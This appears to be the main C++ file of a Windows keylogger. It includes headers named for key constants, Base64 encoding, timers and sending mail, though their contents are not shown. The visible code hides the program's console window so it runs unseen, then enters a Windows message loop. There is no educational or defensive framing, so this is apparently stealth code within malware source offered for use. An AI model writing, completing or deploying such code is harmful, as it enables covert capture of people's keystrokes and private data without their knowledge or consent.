#include <iostream>
#include <Windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"

using namespace std;
void hide();

int main()
{
	hide(); // set console window to appear for a instant
	MSG Msg; // msg object to be processed, but actually never is processed

	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	cout << "hello world!" << endl;
}

void hide()
{
	HWND stealth; // window handler used to hide the outputted console window
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}